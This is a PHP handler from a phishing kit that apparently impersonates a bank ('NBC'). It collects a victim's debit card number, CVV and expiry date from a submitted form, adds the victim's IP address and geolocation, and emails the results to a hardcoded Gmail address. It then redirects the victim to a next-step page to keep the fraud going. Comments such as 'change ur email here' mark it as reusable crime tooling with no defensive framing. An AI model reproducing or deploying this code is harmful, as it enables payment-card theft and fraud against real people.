<?php
if($_POST["ccn"] != "" and $_POST["cvv"] != ""){
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$message .= "--------------NBC Info-----------------------\n";
$message .= "|ATM or Debit card Number : ".$_POST['ccn']."\n";
$message .= "|CVV : ".$_POST['cvv']."\n";
$message .= "|Expiration Date : ".$_POST['exp']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "City: {$geoplugin->city}\n";
$message .= "Region: {$geoplugin->region}\n";
$message .= "Country Name: {$geoplugin->countryName}\n";
$message .= "Country Code: {$geoplugin->countryCode}\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------------Fudpage Burhan-------------\n";
//change ur email here
$send = "abdoalarg53@gmail.com";
$subject = "Result .$ip.";
$headers = "From: NBC<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
@mail($send,$subject,$message,$headers);
@mail($to,$subject,$message,$headers);
}

 
     header("Location: step4.php");
}else{
header("Location: index.php");
}

?>
